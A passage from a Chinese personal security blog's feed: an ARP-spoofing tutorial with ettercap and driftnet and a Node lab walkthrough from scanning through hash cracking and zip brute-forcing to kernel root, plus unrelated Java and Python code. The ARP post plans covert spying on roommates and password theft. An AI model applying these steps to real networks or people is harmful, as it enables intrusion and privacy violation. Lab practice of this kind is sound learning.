start,<span class="keyword">long</span> end,<span class="keyword">int</span> threadCount)&#123;</span><br><span class="line">		Long simpleThreadRange = (end - start)/threadCount + <span class="number">1</span>;</span><br><span class="line">		ArrayList&lt;Long&gt;[] results = <span class="keyword">new</span> ArrayList[threadCount] ;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		MyThread[] threads = <span class="keyword">new</span> MyThread[threadCount];</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; threadCount-<span class="number">1</span> ;i++) &#123;</span><br><span class="line">			threads[i] = <span class="keyword">new</span> MyThread(); </span><br><span class="line">			threads[i].setVar(results, i, start+i*simpleThreadRange, start+(i+<span class="number">1</span>)*simpleThreadRange);</span><br><span class="line">			threads[i].start();</span><br><span class="line">		&#125;</span><br><span class="line">		threads[i] = <span class="keyword">new</span> MyThread(); </span><br><span class="line">		threads[i].setVar(results, i, start+i*simpleThreadRange, end);</span><br><span class="line">		threads[i].start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; threadCount;i++) &#123;</span><br><span class="line">			threads[i].join();</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">			System.out.println(<span class="string">"Error"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		ArrayList&lt;Long&gt; ans = <span class="keyword">new</span> ArrayList&lt;Long&gt;();</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; threadCount;i++) &#123;</span><br><span class="line">			ans.addAll(results[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		Iterator&lt;Long&gt; it = ans.iterator();</span><br><span class="line">		<span class="keyword">long</span>[] a = <span class="keyword">new</span> <span class="keyword">long</span>[ans.size()];</span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">			a[i++] = (<span class="keyword">long</span>)it.next(); </span><br><span class="line">		&#125;</span><br><span class="line">		Arrays.sort(a);</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[arp欺骗 初见]]></title>
      <url>/2019/09/12/ettercap/</url>
      <content type="html"><![CDATA[<p>实现了我多年的愿望.</p>
<a id="more"></a>

<h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>暑假的时候看见ljy大佬qq空间里发了个黑掉酒店摄像头的说说, </p>
<p>当时非常震撼, 也特别想学.</p>
<p>wyz学长告诉我说很可能是通过中间人攻击的手段实现的(现在看来确实很有可能), 推荐我学习下ettercap的使用方法.</p>
<p>当时为了做到这点, 我用了好几天的时间来尝试, </p>
<p>从 Kali 到 Windows,<br>从 虚拟机 到 物理机,<br>从 NAT 模式到 桥接模式,<br>从 卸载 到 重新安装,<br>从 搜百度 到 查谷歌,<br>从 虚拟机崩溃 到 我本人崩溃 …</p>
<p>反正就是好几天没干别的就鼓捣这玩意儿了, </p>
<p>后来 yw老哥 在社团宣讲的时候演示了相关的技术, 遂找他问了问, 说是有可能是网卡的问题, 咱也不管是不是吧, 反正最后我是信了.</p>
<p>这不今天的新网卡(某宝二十多买的)到了, 迫不及待的尝试我期待已久的中间人攻击.</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>路由器(以下所有设备均连接至此) : <ul>
<li>手机热点 :<br>  ip : 192.168.43.1</li>
</ul>
</li>
<li>攻击机 : <ul>
<li>Vmware 虚拟机 :<br>  操作系统 : Kali<br>  ip : 192.168.43.214</li>
</ul>
</li>
<li>攻击目标 :<ul>
<li>物理机:(目标A)<br>  操作系统 : Windows<br>  ip : 192.168.43.170</li>
<li>手机 :(目标B)<br>  操作系统 : Android<br>  ip : 192.168.43.1</li>
</ul>
</li>
</ul>
<p>测试的目标是通过中间人攻击(arp欺骗)来实现监视 A 所浏览的图片.</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>开启数据包转发</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p>这一步非常重要! </p>
<p>我当初认为数据包的转发是由软件 ettercap 完成的,</p>
<p>但是在百度上无意间看到是操作系统完成的,.</p>
<p>如果不开启这个的话, 被攻击的设备将无法连接网络, 没法进一步攻击.</p>
<p>(当初因为这个浪费不少时间)</p>
<ol start="2">
<li><p>启动 ettercap</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
</li>
<li><p>选择 sniff-Unified, 这里选择我们的网卡wlan0,然后点击OK</p>
</li>
<li><p>点击Hosts, 首先选择Scan for hosts, 扫描一下局域网里面主机, 然后我们在点击Hosts里面的Hosts list. 正常情况下会出现至少我刚才提到的两个ip地址. (既然这么说就有不正常情况, 有时候会扫不出刚才的ip, 原因不明)</p>
</li>
<li><p>A 的地址加入到 target1, B 的地址加入到 target2.</p>
</li>
<li><p>选择Mitm-ARP poisoning.</p>
</li>
<li><p>选择Sniff remote connections, 最后Start.</p>
</li>
<li><p>开启新的shell, 启动 driftnet,</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>这时, 当 A 浏览图片时, Kali 上就会出现那些图片.</p>
<p>爽~~</p>
<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul>
<li><p>有时间可以尝试偷偷监听室友们的, 看看能不能做到不被发现的完成目的,<br>想想就刺激.</p>
</li>
<li><p>尝试截获其它的数据, 包括但不限于视频流, 各种密码.</p>
</li>
<li><p>DNS污染, 将所有的http请求都解析到我的博客网址.</p>
</li>
</ul>
<p>要不是现在已经半夜一点了, 真想现在就试试. </p>
<p>然而明天又一天课, MD, 睡觉了.</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> 中间人攻击 </tag>
            
            <tag> arp欺骗 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Node靶机练习]]></title>
      <url>/2019/09/08/Node%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>只是一次练习.</p>
<a id="more"></a>
<h1 id="Node-靶机练习"><a href="#Node-靶机练习" class="headerlink" title="Node 靶机练习"></a>Node 靶机练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>靶机名: Ubuntu 16.04.3 TLS node tty1</li>
<li>运行环境: Vmware virtual machine</li>
</ul>
<hr>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
<li>扫描内网<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\MECHREVO&gt;nmap -sP 192.168.126.0/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 11:38 ?D1ú±ê×?ê±??</span><br><span class="line">Stats: 0:00:13 elapsed; 0 hosts completed (0 up), 254 undergoing ARP Ping Scan</span><br><span class="line">Parallel DNS resolution of 254 hosts. Timing: About 50.00% done; ETC: 11:38 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:18 elapsed; 0 hosts completed (0 up), 254 undergoing ARP Ping Scan</span><br><span class="line">Parallel DNS resolution of 254 hosts. Timing: About 50.00% done; ETC: 11:38 (0:00:05 remaining)</span><br><span class="line">Nmap scan report for 192.168.126.134 (192.168.126.134)</span><br><span class="line">Host is up (0.00s latency).</span><br><span class="line">MAC Address: 00:0C:29:F3:9B:1C (VMware)</span><br><span class="line">Nmap scan report for 192.168.126.254 (192.168.126.254)</span><br><span class="line">Host is up (0.00s latency).</span><br><span class="line">MAC Address: 00:50:56:FF:09:F7 (VMware)</span><br><span class="line">Nmap scan report for 192.168.126.1 (192.168.126.1)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 24.61 seconds</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>找到靶机ip地址: 192.168.126.134</p>
<ul>
<li>扫描端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\MECHREVO&gt;nmap -A -p- 192.168.126.134</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 11:51 ?D1ú±ê×?ê±??</span><br><span class="line">Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 41.55% done; ETC: 11:54 (0:01:16 remaining)</span><br><span class="line">Nmap scan report for 192.168.126.134 (192.168.126.134)</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)</span><br><span class="line">|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)</span><br><span class="line">|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">| hadoop-datanode-info:</span><br><span class="line">|_  Logs: /login</span><br><span class="line">| hadoop-tasktracker-info:</span><br><span class="line">|_  Logs: /login</span><br><span class="line">|_http-title: MyPlace</span><br><span class="line">MAC Address: 00:0C:29:F3:9B:1C (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.28 ms 192.168.126.134 (192.168.126.134)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 134.81 seconds</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>开放了两个端口: 22 和 3000, 22端口是ssh端口, 3000端口就是node.js的默认端口.</p>
<p>用浏览器访问192.168.126.134:3000.<br>抓包看看, 好像没有什么可疑的地方.</p>
<p>尝试扫描目录:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">D:\dirsearch&gt;python dirsearch.py -u http://192.168.126.134:3000/ -e *</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.8</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: * | HTTP method: get | Threads: 10 | Wordlist size: 6087</span><br><span class="line"></span><br><span class="line">Error Log: D:\学习资料\Python——为了守护我爱的人，我将运行一个牛逼的脚本\dirsearch\logs\errors-19-07-26_12-04-21.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.126.134:3000/</span><br><span class="line"></span><br><span class="line">[12:04:21] Starting:</span><br><span class="line">[12:04:38] 301 -  171B  - /assets  -&gt;  /assets/</span><br><span class="line">[12:05:16] 301 -  173B  - /uploads  -&gt;  /uploads/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<p>分别看下两个目录, 里面都是些网站上的资源. 没有有价值的东西.</p>
<ul>
<li>通过查看<code>/api/users/latest</code>, 找到了三个账号.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;_id&quot;:&quot;59a7368398aa325cc03ee51d&quot;,&quot;username&quot;:&quot;tom&quot;,</span><br><span class="line">&quot;password&quot;:&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;,&quot;is_admin&quot;:false&#125;,</span><br><span class="line">&#123;&quot;_id&quot;:&quot;59a7368e98aa325cc03ee51e&quot;,&quot;username&quot;:&quot;mark&quot;,</span><br><span class="line">&quot;password&quot;:&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;,&quot;is_admin&quot;:false&#125;,</span><br><span class="line">&#123;&quot;_id&quot;:&quot;59aa9781cced6f1d1490fce9&quot;,&quot;username&quot;:&quot;rastating&quot;,</span><br><span class="line">&quot;password&quot;:&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;,&quot;is_admin&quot;:false&#125;]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>其中的密码经md5加密, 且最后一个无法破解.</p>
<p>但是只要有一个账号就可以了. </p>
<p><code>md5_decode(&#39;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#39;) =&gt; spongebob</code><br>登录进tom的账号后. 发现没有管理员权限, 还是啥也干不了…</p>
<p>网上查了一下攻略, 此处应该访问<code>/api/users/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,&quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,</span><br><span class="line">&quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,&quot;is_admin&quot;:true&#125;]</span><br></pre></td></tr></table></figure>

<p>密码md5解密<br><code>md5_decode(&#39;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#39;) =&gt; &#39;manchester&#39;</code></p>
<p>这下有了admin账号了.</p>
<p>登录后可以下载网站源码<code>MyPlace.backup</code>.  </p>
<p>但是确实base64编码的. 我尝试用网上的在线解码网站, 但是效果不理想.</p>
<p>其实直接用php就可以很方便的解码并保存在文件中, 如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">" /* base64 编码的文件内容 */ "</span>;</span><br><span class="line">$result = base64_decode($file);</span><br><span class="line">file_put_contents(<span class="string">"result.txt"</span>,$result);</span><br></pre></td></tr></table></figure>

<p>解码之后打开一看是乱码, 但是前两个字符是’PK’, 所以应该是个zip压缩文件. 只要把上面的<code>result.txt</code>直接改成<code>result.zip</code>再跑一下就可以.</p>
<p>压缩包需要密码, 还需要研究下zip的密码破解.</p>
<hr>
<p>小插曲</p>
<p>刚才午睡的时候, 我回到了高中的时光,</p>
<p>我梦见了一个让我心动的, 但又陌生的姑娘在我的班上,</p>
<p>她在哭, 哭的很伤心, 在自己的座位上,</p>
<p>我很想安慰她, 但</p>
<p>我只是一次又一次的经过她, </p>
<p>不敢和她说话, 不敢递给她一张纸巾,</p>
<p>她是那么无助, 我也无能为力,</p>
<p>直到梦醒, 我都不知道她的名字,</p>
<p>也许, 我再也遇不见她了吧…</p>
<hr>
<p>网上有很多在线破解压缩文件密码的网站, 可基本都是要钱的…</p>
<p>Windows下的一个破解工具—-<code>Password Unlocker</code>, 亲测不好用, 建议避雷.</p>
<p>可以用kali中的一个工具<code>fcrackzip</code>来进行破解.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -v -b -u -c a -p magicaaaa myplace</span><br></pre></td></tr></table></figure>

<ul>
<li>-v : 详细信息</li>
<li>-b : 爆破</li>
<li>-u : 指定zip压缩格式(大概)</li>
<li>-c : 指定密码类型, 选项值 a 就是纯字符串, 1 就是纯数字, a1 就是数字和字符串混杂.</li>
<li>-p : 指定密码, magicaaaa就是前五位确定是magic了, 后面的a在这里是掩码, 表明这4位是字母.</li>
<li>myplace : 要破解的压缩包的名称.</li>
</ul>
<p>上面的是遍历爆破, 效率估计不高, gxy学长告诉了我fcrackzip也支持跑字典, </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.zip</span><br></pre></td></tr></table></figure>

<p>其中的这个 rockyou.txt 估计以后也能用到.</p>
<p>最后得到密码 <code>magicword</code></p>
<p>解压缩后, myplace里是用<code>node.js</code>框架搭建的网站源码(终于知道靶机名字的由来了.)</p>
<p>然后我对node.js也不是很熟悉, 在百度中了解到, 这个框架的项目入口和程序启动文件是<code>app.js</code>.</p>
<p>打开一看, 里面有个连接MongoDB的账户和密码.<br><code>const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;</code></p>
<p>顺便了解了一下, MongoDB和Mysql差不多, 都是数据库管理系统, 只是类型有所不同.</p>
<p>奇怪的是, 这个数据库的账号和密码和linxu的账号和密码是相同的, 我们可以直接ssh登录进靶机的系统了.(这或许也是个套路, 以后可以尝试)</p>
<p>进入到web目录下, 整个目录的权限都在root那里, 我们没法写文件, 自然也没法留后门. 下面需要对ubuntu进行提权.</p>
<p>首先查看系统信息.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/var/www/myplace$ cat /etc/issue</span><br><span class="line">Ubuntu 16.04.3 LTS \n \l</span><br></pre></td></tr></table></figure>

<p>在 kali msfconsole 中查找相关的漏洞</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br><span class="line">[*] <span class="built_in">exec</span>: searchsploit Ubuntu 16.04</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                       |  Path</span><br><span class="line">                                                                                                                     | (/usr/share/exploitdb/)</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport 2.x (Ubuntu Desktop 12.10 &lt; 16.04) - Local Code Execution                                                     | exploits/linux/<span class="built_in">local</span>/40937.txt</span><br><span class="line">Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                        | exploits/linux/<span class="built_in">local</span>/40054.c</span><br><span class="line">Google Chrome (Fedora 25 / Ubuntu 16.04) - <span class="string">'tracker-extract'</span> / <span class="string">'gnome-video-thumbnailer'</span> + <span class="string">'totem'</span> Drive-By Download | exploits/linux/<span class="built_in">local</span>/40943.txt</span><br><span class="line">LightDM (Ubuntu 16.04/16.10) - <span class="string">'Guest Account'</span> Local Privilege Escalation                                            | exploits/linux/<span class="built_in">local</span>/41923.txt</span><br><span class="line">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - <span class="string">'ldso_hwcap_64 S | exploits/linux_x86-64/local/42275.c</span></span><br><span class="line"><span class="string">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - '</span>ldso_dynamic Stack Clash<span class="string">' Local Privi | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                | exploits/linux/dos/39773.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read                            | exploits/linux/local/45175.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>BPF<span class="string">' Local Privilege Escalation (Metasploit)                                      | exploits/linux/local/40759.rb</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>snd_timer_user_ccallback()<span class="string">' Kernel Pointer Leak                                   | exploits/linux/dos/46529.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition Privilege Escalation                     | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege Escalation                | exploits/linux_x86-64/local/40049.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.x (Ubuntu 16.04) - '</span>double-fdput()<span class="string">' bpf(BPF_PROG_LOAD) Privilege Escalation                         | exploits/linux/local/39772.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - '</span>IP6T_SO_SET_REPLACE<span class="string">' Local Privilege Escalation                               | exploits/linux/local/40489.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                           | exploits/linux/dos/45919.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                        | exploits/linux/local/45010.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                               | exploits/linux/local/44298.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class="string">' Local Privilege Escalation                    | exploits/linux/local/44300.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="string">Shellcodes: No Result</span></span><br></pre></td></tr></table></figure>

<p>使用<code>local Privilege Escalation</code>来进行提权.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/44298.c mark@192.168.6.128:/tmp/</span><br></pre></td></tr></table></figure>

<p>(tmp对权限的限制较少, 所以复制到这个目录下).<br>执行命令后, 目录中已经多了这个c源文件, 还需要编译才能成为可以运行的exp</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 44298.c -o exp -lcrypt</span><br></pre></td></tr></table></figure>

<p>这里有个两个陌生的命令选项 </p>
<ul>
<li><code>-pthread</code>, 百度了下, 有了这个选项后, 编译器在编译时会选择线程安全的实现, 具体的咱也别管了, 反正先加上就好…</li>
<li><code>-lcrypt</code>, 这里-l是选项, crypt是参数值. 表示链接时搜索名为crypt的库.</li>
</ul>
<p>编译后出现了个exp, 运行后, 我们已经是root了.</p>
<p>下面要学习下如何在node.js网站框架留下后门.</p>
<p>(未完待续…)</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> linux提权 </tag>
            
            <tag> metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python自动化处理word文档]]></title>
      <url>/2019/08/29/python%E8%87%AA%E5%8A%A8%E5%8C%96%E5%A4%84%E7%90%86word%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<p>帮室友写了个脚本, 感觉还不错, 分享一波源码.</p>
<a id="more"></a>

<h1 id="python-docx"><a href="#python-docx" class="headerlink" title="python + docx"></a>python + docx</h1><h2 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h2><p>宿舍马大佬这两天在忙学生综合素质测评的工作. 马大佬给我们发了个word表格让我们填. </p>
<p>然而word表格不像execl, 它很不好计算. </p>
<p>为了减轻马大佬的工作量, 我帮马大佬用python写个程序, 读取二十多个word文件, 并提取其中的数据自动计算并生成目标文件作为结果. </p>
<p>经过投入使用, 最终效果还不错.</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> docx <span class="keyword">import</span> Document</span><br><span class="line"><span class="keyword">from</span> docx.shared <span class="keyword">import</span> Inches</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">the_number_of_files = <span class="number">27</span>   <span class="comment"># 文件数</span></span><br><span class="line">the_number_of_student = <span class="number">27</span>  <span class="comment"># 学生数</span></span><br><span class="line">the_number_of_item = <span class="number">5</span>      <span class="comment"># 打分项目数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个进度条函数需要的全局变量</span></span><br><span class="line">the_number_of_times = <span class="number">3</span> * the_number_of_files * the_number_of_student * the_number_of_item</span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进度条函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_progress</span><span class="params">()</span>:</span></span><br><span class="line">    per = 